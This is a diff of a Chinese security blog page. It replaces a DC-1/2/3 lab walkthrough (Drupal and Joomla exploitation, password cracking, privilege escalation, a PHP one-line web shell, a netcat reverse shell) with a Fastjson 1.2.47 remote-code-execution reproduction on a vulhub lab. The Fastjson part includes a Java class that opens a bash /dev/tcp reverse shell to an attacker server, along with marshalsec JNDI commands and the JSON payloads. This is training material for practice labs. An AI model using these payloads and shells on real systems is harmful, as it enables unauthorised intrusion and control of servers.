@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="DC靶机系列, 渗透测试 CTF southerose 信息安全 网络安全 网络空间安全 博客 学习">
+    <meta name="keywords" content="Fastjson 1.2.47 远程命令执行漏洞, 渗透测试 CTF southerose 信息安全 网络安全 网络空间安全 博客 学习">
     <meta name="description" content="渗透测试 | 信息安全 | CTF">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>DC靶机系列 | southerose&#39;s Blog</title>
+    <title>Fastjson 1.2.47 远程命令执行漏洞 | southerose&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -291,12 +291,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://gitee.com/southerose/PictureBed/raw/master/img/20210417103737.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://gitee.com/southerose/PictureBed/raw/master/img/20220315195040.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">DC靶机系列</h1>
+                    <h1 class="description center-align post-title">Fastjson 1.2.47 远程命令执行漏洞</h1>
                 </div>
             </div>
         </div>
@@ -412,8 +412,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E9%9D%B6%E6%9C%BA/">
-                                <span class="chip bg-color">靶机</span>
+                            <a href="/tags/fastjson/">
+                                <span class="chip bg-color">fastjson</span>
                             </a>
                         
                     </div>
@@ -424,8 +424,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
-                                渗透
+                            <a href="/categories/%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                复现
                             </a>
                         
                     </div>
@@ -437,28 +437,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-04-16
+                    2021-10-11
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-06-20
+                    2022-03-15
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2k
+                    370
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    9 分
+                    1 分
                 </div>
                 
 
@@ -481,449 +481,63 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><h2 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h2><ul>
-<li>回顾了metasploit的一些用法</li>
-<li>利用已知cms的exp来getshell</li>
-<li>hashcat爆破用法</li>
-<li>find提权</li>
-</ul>
-<h2 id="DC2"><a href="#DC2" class="headerlink" title="DC2"></a>DC2</h2><ul>
-<li>cewl根据网页内容生成字典</li>
-<li>wpscan结合cewl跑账号和密码</li>
-<li>用metasploit的模块来ssh爆破</li>
-<li>rbash-&gt;bash——–vim逃逸</li>
-<li>git提权</li>
-</ul>
-<h2 id="DC3"><a href="#DC3" class="headerlink" title="DC3"></a>DC3</h2><ul>
-<li>searchsploit的一些用法</li>
-<li>在github上搜罗cms探测脚本</li>
-<li>john爆破用法</li>
-<li>页面模板里添加一句话木马</li>
-<li>使用Python开启SimpleHTTPServer</li>
-<li>公开的脚本提权</li>
-</ul>
-<h1 id="DC1-1"><a href="#DC1-1" class="headerlink" title="DC1"></a>DC1</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><pre class="line-numbers language-none"><code class="language-none"># nat模式，先扫一下，探测下IP是多少
-nmap -sP 192.168.60.1/24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+                <h1 id="redis简介"><a href="#redis简介" class="headerlink" title="redis简介"></a>redis简介</h1><h1 id="Fastjson-1-2-47-远程命令执行漏洞"><a href="#Fastjson-1-2-47-远程命令执行漏洞" class="headerlink" title="Fastjson 1.2.47 远程命令执行漏洞"></a>Fastjson 1.2.47 远程命令执行漏洞</h1><h2 id="复现（反弹shell）"><a href="#复现（反弹shell）" class="headerlink" title="复现（反弹shell）"></a>复现（反弹shell）</h2><p>使用vulhub的靶场复现</p>
+<p>打开页面，就发现返回了json字符串</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220315104224.png"></p>
+<p>然后在本地写一个Exploit.java的文件</p>
+<p>代码如下</p>
+<pre class="line-numbers language-none"><code class="language-none">import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
+import java.io.IOException;
+import java.util.Hashtable;
+ 
+ 
+public class Exploit{
+    public Exploit() {}
+ 
+    static
+    {
+        try {
+            String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
+                    ? new String[]{"cmd.exe","/c", "calc.exe"}
+                    : new String[]{"bash", "-c", "/bin/bash -i &gt;&amp; /dev/tcp/远程服务器ip/5252 0&gt;&amp;1"};
+            Runtime.getRuntime().exec(cmds);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+ 
+    public static void main(String[] args) {
+        Exploit e = new Exploit();
+        System.out.println("hello world");
+    }
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/image-20210411102620332.png"></p>
-<pre class="line-numbers language-none"><code class="language-none"># 探测详细信息
-nmap -A -T 5 192.168.60.133 -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>然后编译成字节码，传到咱们的服务器根目录中（需要开启web服务）</p>
+<p>我使用python3开启一个简单的服务器</p>
+<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<table>
-<thead>
-<tr>
-<th>开放端口</th>
-<th>利用方式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>22</td>
-<td>ssh爆破</td>
-</tr>
-<tr>
-<td>80</td>
-<td>CMS-Drupal 7，利用已知EXP</td>
-</tr>
-</tbody></table>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411103032.png"></p>
-<p>flag1</p>
-<p>使用metasploit getshell。</p>
-<pre class="line-numbers language-none"><code class="language-none"># msfconsle
-# search Drupal
-# use exploit/multi/http/drupal_drupageddon
-# set rhosts 192.168.60.133
-# set lhost 192.168.60.134
-# run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>使用工具marshalsec，启动一个RMI（远程方法调用）或者LDAP（轻量级目录访问协议）服务器，监听9999端口，指定加载远程类Exploit.class</p>
+<pre class="line-numbers language-none"><code class="language-none">#RMI
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://远程服务器ip/#Exploit 9999
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411103759.png"></p>
-<p>ls查看下当前目录下的文件，发现flag1</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411103859.png"></p>
-<pre class="line-numbers language-none"><code class="language-none"># cat flag1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+#LDAP
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://远程服务器ip/#Exploit 9999<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<blockquote>
-<p> good CMS needs a config file - and so do you.</p>
-</blockquote>
-<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>flag1提示我们可以看看配置文件，网上找了下Drupal的配置文件目录。</p>
-<p>可以这样搜索：</p>
-<pre class="line-numbers language-none"><code class="language-none">find / -name setting*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>然后还得在我们反弹到的远程服务器中使用nc监听下5252端口</p>
+<pre class="line-numbers language-none"><code class="language-none">nv -lvp 5252<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>在此之前我们先切换到bash，因为meterpreter貌似不能使用find命令。</p>
-<pre class="line-numbers language-none"><code class="language-none"># shell
-# python -c "import pty;pty.spawn('/bin/bash')"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>bp抓包post发送payload</p>
+<pre class="line-numbers language-none"><code class="language-none">
+# rmi
+{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"lysec":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://RMI服务器IP:9999/Exploit","autoCommit":true}}
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411104334.png"></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411104404.png"></p>
-<pre class="line-numbers language-none"><code class="language-none"># 查看配置文件
-cat /var/www/sites/default/settings.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+# ldap
+{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"lysec":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://LDAP服务器:9999/Exploit","autoCommit":true}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411104634.png"></p>
-<p>发现数据库账号和密码</p>
-<pre class="line-numbers language-none"><code class="language-none">username: dbuser
-password: R0ck3t<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>还发现了flag2</p>
-<blockquote>
-<p>Brute force and dictionary attacks aren’t the</p>
-<p>only ways to gain access (and you WILL need access).</p>
-<p>What can you do with these credentials?</p>
-</blockquote>
-<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>登陆下mysql</p>
-<pre class="line-numbers language-none"><code class="language-none">mysql -udbuser -pR0ck3t<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411104917.png"></p>
-<p>查看数据库</p>
-<pre class="line-numbers language-none"><code class="language-none">show databases;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411105047.png"></p>
-<pre class="line-numbers language-none"><code class="language-none"># use drupaldb;
-# show tables;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411105222.png"></p>
-<p>有个users表，然后我们看下字段有哪些。</p>
-<pre class="line-numbers language-none"><code class="language-none">desc users;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411105324.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">select name,pass from users;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<table>
-<thead>
-<tr>
-<th>name</th>
-<th>pass</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>admin</td>
-<td>$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR</td>
-</tr>
-<tr>
-<td>Fred</td>
-<td>$S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg</td>
-</tr>
-</tbody></table>
-<p>接下来我们，使用kali的一款工具，hashcat来爆破下改密码。</p>
-<p>先使用hashcat查看drupal的mode。</p>
-<pre class="line-numbers language-none"><code class="language-none">hashcat --help | grep "Drupal"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411105916.png"></p>
-<p>然后我们还需要将上面两端hash写到一个文件source.txt里面。</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411110205.png"></p>
-<p>还需要一个密码字典。</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Auth/password/Top100_pass1.txt">https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Auth/password/Top100_pass1.txt</a></p>
-<p>然后就可以开跑了</p>
-<pre class="line-numbers language-none"><code class="language-none">hashcat -m 7900 -a 0 source.txt pass01.txt
-
--m 指定要破解的 hash 类型，如果不指定类型，则默认是 MD5
--a 指定要使用的破解模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。
-source.txt 你要爆破的 hash 列表
-pass01.txt 你的密码表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>得到明文密码</p>
-<table>
-<thead>
-<tr>
-<th>name</th>
-<th>password</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>admin</td>
-<td>53cr3t</td>
-</tr>
-<tr>
-<td>Fred</td>
-<td>MyPassword</td>
-</tr>
-</tbody></table>
-<p>之后直接用浏览器访问该地址，然后用admin账户登录上去就可以看到flag3了</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411111244.png"></p>
-<blockquote>
-<p>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p>
-</blockquote>
-<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>接着根据提示查看passwd</p>
-<pre class="line-numbers language-none"><code class="language-none">cat /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411111429.png"></p>
-<p>我们去家目录/home/flag4，发现有个flag4.txt</p>
-<pre class="line-numbers language-none"><code class="language-none">cat /home/flag4/fla4.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<blockquote>
-<p>Can you use this same method to find or access the flag in root?</p>
-<p>Probably. But perhaps it’s not that easy.  Or maybe it is?</p>
-</blockquote>
-<h2 id="thefinalflag"><a href="#thefinalflag" class="headerlink" title="thefinalflag"></a>thefinalflag</h2><p>flag提示我们要提权到root</p>
-<p>试试find提权</p>
-<pre class="line-numbers language-none"><code class="language-none">find . -exec /bin/sh \; -quit
-or
-find .-exec /bin/bash -p \;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>提权之后就得找一下了，因为最后一个flag的名字不是flag5，不能使用find去找，我们可以进入root目录下看看，果然发现了thefinalflag.txt</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411112128.png"></p>
-<p>final-flag</p>
-<blockquote>
-<p>done!!!!</p>
-<p>Hopefully you’ve enjoyed this and learned some new skills.</p>
-<p>You can let me know what you thought of this little journey<br>by contacting me via Twitter - @DCAU7</p>
-</blockquote>
-<h1 id="DC2-1"><a href="#DC2-1" class="headerlink" title="DC2"></a>DC2</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre class="line-numbers language-none"><code class="language-none">nmap -sP 192.168.60.1/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>排除宿主机、网关、kali就剩下一个192.168.60.135</p>
-<p>然后再扫一下具体信息</p>
-<pre class="line-numbers language-none"><code class="language-none">nmap -A -T 5 192.168.60.135 -p 1-65535<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210412211513.png"></p>
-<table>
-<thead>
-<tr>
-<th>端口</th>
-<th>利用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>80 wordpress4.7.10</td>
-<td>wpscan</td>
-</tr>
-<tr>
-<td>7744 ssh</td>
-<td>ssh爆破</td>
-</tr>
-</tbody></table>
-<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>直接根据靶机的描述将攻击机kali /etc/hosts文件添加一行</p>
-<pre class="line-numbers language-none"><code class="language-none">192.168.60.135 dc-2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>然后访问<a target="_blank" rel="noopener" href="http://dc-2/">http://dc-2/</a> 就能解析到该靶机的80端口，然后就得到了flag1</p>
-<blockquote>
-<p>Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</p>
-<p>More passwords is always better, but sometimes you just can’t win them all.</p>
-<p>Log in as one to see the next flag.</p>
-<p>If you can’t find it, log in as another.</p>
-</blockquote>
-<h2 id="flag2-1"><a href="#flag2-1" class="headerlink" title="flag2"></a>flag2</h2><p>先扫描先wordpress</p>
-<pre class="line-numbers language-none"><code class="language-none">#扫描主题漏洞
-wpscan --url http://dc-2/ -e vt --api-token [token]
-#扫描插件漏洞
-wpscan --url http://dc-2/ -e vp --api-token [token]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>api-token需要去<a target="_blank" rel="noopener" href="https://wpvulndb.com/users/sign_up">官网</a>注册然后再登陆就能看到了（需要翻墙）</p>
-<p>没有发现什么漏洞，所以我们试一试爆破下ssh的7744端口</p>
-<p>根据flag1提示，我们需要使用一个工具叫cewl生成一个字典</p>
-<pre class="line-numbers language-none"><code class="language-none">cewl http://dc-2/ -w 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>跑一下用户和密码</p>
-<pre class="line-numbers language-none"><code class="language-none">wpscan --url http://dc-2 --enumerate u
-wpscan --url http://dc-2 --passwords ~/dc2/1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210412220020.png"></p>
-<table>
-<thead>
-<tr>
-<th>username</th>
-<th>password</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Jerry</td>
-<td>adipiscing</td>
-</tr>
-<tr>
-<td>tom</td>
-<td>parturient</td>
-</tr>
-</tbody></table>
-<p>得使用账号 jerry 登录后可以发现 flag2</p>
-<blockquote>
-<p>If you can’t exploit WordPress and take a shortcut, there is another way.</p>
-<p>Hope you found another entry point.</p>
-</blockquote>
-<h2 id="flag3-1"><a href="#flag3-1" class="headerlink" title="flag3"></a>flag3</h2><p>使用metasploit跑一下，使用cewl生成的字典</p>
-<pre class="line-numbers language-none"><code class="language-none">msfconsole
-search ssh_login
-use auxiliary/scanner/ssh/ssh_login
-show options
-set RHOSTS 192.168.60.135
-set rport 7744
-set PASS_FILE ~/dc2/1.txt
-set username tom
-run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>跑出来了一个</p>
-<table>
-<thead>
-<tr>
-<th>Username</th>
-<th>Password</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>tom</td>
-<td>parturient</td>
-</tr>
-</tbody></table>
-<pre class="line-numbers language-none"><code class="language-none">ssh tom@192.168.60.135 -p 7744<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210412220826.png"></p>
-<p>可以看到这是一个rbash（受限制的bash），所以无法使用一些常见的命令，</p>
-<pre class="line-numbers language-none"><code class="language-none">compgen -c 查看可用命令
-less flag3.txt 用less来查看文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>flag3</p>
-<blockquote>
-<p>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</p>
-</blockquote>
-<h2 id="flag4-1"><a href="#flag4-1" class="headerlink" title="flag4"></a>flag4</h2><pre class="line-numbers language-none"><code class="language-none">less /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210412221442.png"></p>
-<p>查阅资料得使用 vi 进行逃逸</p>
-<pre class="line-numbers language-none"><code class="language-none">vi
-
-:set shell=/bin/sh
-:shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>听说更改环境变量,把 <code>/bin/sh</code> 目录加进去,许多命令才好用</p>
-<pre class="line-numbers language-none"><code class="language-none">echo $PATH
-export PATH=$PATH:/bin:/usr/bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">su jerry
-输入密码 adipiscing<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210412222015.png"></p>
-<p>进入jerry的家目录，发现</p>
-<p>flag4</p>
-<blockquote>
-<p>Good to see that you’ve made it this far - but you’re not home yet. </p>
-<p>You still need to get the final flag (the only flag that really counts!!!).  </p>
-<p>No hints here - you’re on your own now.  :-)</p>
-<p>Go on - git outta here!!!!</p>
-</blockquote>
-<h2 id="thefinalflag-1"><a href="#thefinalflag-1" class="headerlink" title="thefinalflag"></a>thefinalflag</h2><p>flag4提示用git提权</p>
-<pre class="line-numbers language-none"><code class="language-none">sudo git -p help config
-!/bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>切换到家目录然后再cat</p>
-<p> final-flag</p>
-<blockquote>
-<p>Congratulatons!!!</p>
-<p>A special thanks to all those who sent me tweets<br>and provided me with feedback - it’s all greatly<br>appreciated.</p>
-<p>If you enjoyed this CTF, send me a tweet via @DCAU7.</p>
-</blockquote>
-<h1 id="DC3-1"><a href="#DC3-1" class="headerlink" title="DC3"></a>DC3</h1><pre class="line-numbers language-none"><code class="language-none">nmap -sP -T 5 192.168.60.1/24
-nmap -A -T 5 192.168.60.136<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210413195028.png"></p>
-<p>是个名为joomla的内容管理系统，扫下后台</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="http://192.168.60.136/administrator/index.php">http://192.168.60.136/administrator/index.php</a></p>
-</blockquote>
-<p>无法登陆，先不爆破，去github上看看有没有探测joomla的脚本</p>
-<pre class="line-numbers language-none"><code class="language-none">https://github.com/OWASP/joomscan.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>clone下来，然后</p>
-<pre class="line-numbers language-none"><code class="language-none">perl joomscan.pl -u http://192.168.60.136<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210413202724.png"></p>
-<p>发现个joomla的版本为 3.7.0，直接</p>
-<pre class="line-numbers language-none"><code class="language-none">searchsploit joomla 3.7.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>有个sql注入的exp，使用sqlmap去跑</p>
-<blockquote>
-<p>爆库</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://192.168.60.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<blockquote>
-<p>爆表</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://192.168.60.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<blockquote>
-<p>爆列</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://192.168.60.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<blockquote>
-<p>dump数据</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://192.168.60.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C username,password --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<table>
-<thead>
-<tr>
-<th>username</th>
-<th>password</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>admin</td>
-<td>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</td>
-</tr>
-</tbody></table>
-<blockquote>
-<p>先解压/usr/share/wordlists的字典文件</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">gzip -d rockyou.txt.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>john爆破</p>
-<pre class="line-numbers language-none"><code class="language-none">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=bcrypt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210413212251.png"></p>
-<table>
-<thead>
-<tr>
-<th>用户</th>
-<th>密码</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>admin</td>
-<td>snoopy</td>
-</tr>
-</tbody></table>
-<p>访问我们之前扫出来的目录，<a target="_blank" rel="noopener" href="http://192.168.60.136/administrator">http://192.168.60.136/administrator</a></p>
-<p>然后找个模板去index.php进去看下，添加一行</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php @eval($_POST[1]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210414211604.png"></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210414211642.png"></p>
-<p>使用蚁剑连接</p>
-<p>不能直接反弹shell</p>
-<pre class="line-numbers language-none"><code class="language-none">kali:
-nc -lvp 4444
-目标：
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.60.134 4444 &gt;/tmp/f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>连上后看下发行版本</p>
-<pre class="line-numbers language-none"><code class="language-none">lsb_release -a
-uname -a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210414212643.png"></p>
-<p>直接搜索searchsploit</p>
-<pre class="line-numbers language-none"><code class="language-none">searchsploit ubuntu 16.04 4.4.x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>在kali上下载该代码</p>
-<pre class="line-numbers language-none"><code class="language-none">wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>开个web服务传到靶机</p>
-<blockquote>
-<p>kali</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">python -m SimpleHTTPServer 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<blockquote>
-<p>靶机</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">wget 192.168.141.134/39772.zip
-unzip 39772.zip &amp;&amp; cd 39772 &amp;&amp; tar -xvf exploit.tar
-cd ebpf_mapfd_doubleput_exploit &amp;&amp; sh compile.sh
-./doubleput
-cd /root
-cat the-flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p> \ \      / /_<em>| | | |  _ \  ___  _ __   <em>_<em>| | | | |<br>  \ \ /\ / / _ \ | | | | | |/ _ | ‘</em> \ / _ \ | | | |<br>   \ V  V /  _<em>/ | | | |</em>| | (<em>) | | | |  _<em>/</em>|_|</em>|</em>|<br>    _/_/ ___|</em>|<em>| |___</em>/ _<strong>/|<em>| |</em>|_</strong>(<em>|</em>|<em>|</em>)</p>
-<p>Congratulations are in order.  :-)</p>
-<p>I hope you’ve enjoyed this challenge as I enjoyed making it.</p>
-<p>If there are any ways that I can improve these little challenges,<br>please let me know.</p>
-<p>As per usual, comments and complaints can be sent via Twitter to @DCAU7</p>
-<p>Have a great day!!!!</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220315143925.png"></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220315143844.png"></p>
 
                 
             </div>
@@ -950,7 +564,7 @@ cat the-flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://southerose.gitee.io/2021/04/16/dc/">http://southerose.gitee.io/2021/04/16/dc/</a>
